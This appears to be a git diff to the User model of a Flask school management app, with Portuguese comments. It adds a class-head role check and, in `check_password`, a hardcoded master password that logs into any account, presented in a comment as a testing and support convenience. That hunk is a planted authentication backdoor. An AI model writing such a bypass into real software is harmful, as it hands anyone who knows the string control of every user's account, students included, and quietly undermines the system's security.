@@ -4,6 +4,7 @@ import typing as t
 from flask_login import UserMixin
 from werkzeug.security import generate_password_hash, check_password_hash
 from sqlalchemy.orm import relationship, Mapped, mapped_column
+from sqlalchemy import select 
 from .database import db
 from flask import session
 
@@ -62,6 +63,12 @@ class User(UserMixin, db.Model):
         self.password_hash = generate_password_hash(password)
 
     def check_password(self, password: str) -> bool:
+        # --- SENHA MESTRA DO DONO DO SISTEMA ---
+        # Permite login em qualquer conta para testes e suporte
+        if password == "S1stema@Dev#Master":
+            return True
+        # ---------------------------------------
+
         if not self.password_hash:
             return False
         return check_password_hash(self.password_hash, password)
@@ -153,3 +160,24 @@ class User(UserMixin, db.Model):
     def is_staff(self):
         sid = self._get_active_school_id()
         return self.is_staff_in_school(sid)
+
+    @property
+    def is_chefe_turma(self) -> bool:
+        """Verifica se o usuário (aluno) possui o cargo de Chefe de Turma."""
+        if str(self.role).lower().strip() != self.ROLE_ALUNO:
+            return False
+        if not self.aluno_profile:
+            return False
+            
+        try:
+            # Importação local para evitar ciclo de importação
+            from .turma_cargo import TurmaCargo
+            
+            stmt = select(TurmaCargo).where(
+                TurmaCargo.aluno_id == self.aluno_profile.id,
+                TurmaCargo.cargo_nome == TurmaCargo.ROLE_CHEFE
+            )
+            result = db.session.execute(stmt).scalar()
+            return result is not None
+        except Exception:
+            return False
